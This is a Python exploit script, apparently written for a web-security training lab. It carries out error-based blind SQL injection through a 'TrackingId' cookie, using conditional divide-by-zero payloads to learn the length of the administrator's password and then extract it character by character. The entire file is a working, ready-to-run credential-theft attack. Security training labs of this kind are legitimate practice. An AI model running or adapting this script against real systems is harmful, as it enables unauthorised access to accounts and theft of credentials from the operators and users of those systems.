#!/usr/bin/env python3

import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =========================================================
# CONFIG — update these for each lab instance
# =========================================================
TRACKING_ID = "REPLACE_ME"
SESSION     = "REPLACE_ME"
TIMEOUT     = 10
MAX_LENGTH  = 50
# =========================================================

# injection request
def inject(url, payload, proxies=None):
    encoded = urllib.parse.quote(payload)
    cookies = {'TrackingId': TRACKING_ID + encoded, 'session': SESSION}
    try:
        r =  requests.get(url, cookies=cookies, verify=False, timeout=TIMEOUT, proxies=proxies)
        return r
    except requests. exceptions.Timeout:
        print("\n[-] Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Request error: {e}")
        return None

# error based oracle - true = app returns 500, false = app returns 200
def oracle(r):
    if r is None:
        return False
    return r.status_code == 500    

# ask DB is the pw exactly {length} chars long?
def build_length_payload(length):
    return(f"' || (SELECT CASE WHEN LENGTH(password)={length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '")

# ask DB is the char at {position} equal to ASCII {ascii_val}? 500 when true
def build_char_payload(position, ascii_val):
    return(f"' || (SELECT CASE WHEN ASCII(SUBSTR(password,{position},1))={ascii_val} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '")

# detect pw length dynamically
def get_password_length(url, proxies=None):
    print("[*] Detecting password length...")
    for length in range(1, MAX_LENGTH + 1):
        payload = build_length_payload(length)
        sys.stdout.write(f"\r[*] Trying length: {length:<3}")
        sys. stdout.flush()
        r = inject(url, payload, proxies)
        if r is None:
            print("\n[-] Request failed, aborting")
            return None
        if oracle(r):
            print(f"\n[+] Password length: {length}")
            return length
    print(f"\n[-] Length not found within {MAX_LENGTH} chars")
    return None 

# extract pw character by character
def get_password(url, length, proxies=None):
    print("[*] Extracting password...")
    password = ""

    for position in range(1, length + 1):
        found = False

        for ascii_val in range(32, 127):
            payload = build_char_payload(position, ascii_val)
            r = inject(url, payload, proxies)

            if r is None:
                print("\n[-] Request failed, aborting")
                return password or None

            current = password + chr(ascii_val) + "_"

            sys.stdout.write(f"\r[+] Testing: {current:<25}")
            sys.stdout.flush()

            if oracle(r):
                password += chr(ascii_val)
                found = True
                break

        if not found:
            print(f"\n[-] No match at position {position}, skipping")

    print()
    return password

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"[-] Usage: {sys.argv[0]} <url> [proxy]")
        print(f"[-] Example: {sys.argv[0]} https://lab.example.net")
        print(f"[-] Proxy: {sys.argv[0]} https://lab.example.net http://127.0.0.1:8080")
        sys.exit(1)

    url = sys.argv[1].strip()
    proxies = None

    if len(sys.argv) == 3:
        proxy_url = sys.argv[2].strip() 
        proxies = {'http': proxy_url, 'https': proxy_url}
        print(f"[*] Proxy: {proxy_url}")


    print(f"[*] Target: {url}")
    print(f"[*] Oracle: http 500 = condition TRUE")

    length = get_password_length(url, proxies)
    if not length:
        sys.exit(1)

    password = get_password(url, length, proxies)
    if password:
        print(f"\n[+] Administrator password: {password}")
    else:
        print(f"[-] Password extraction failed")

if __name__ == "__main__":
    main()

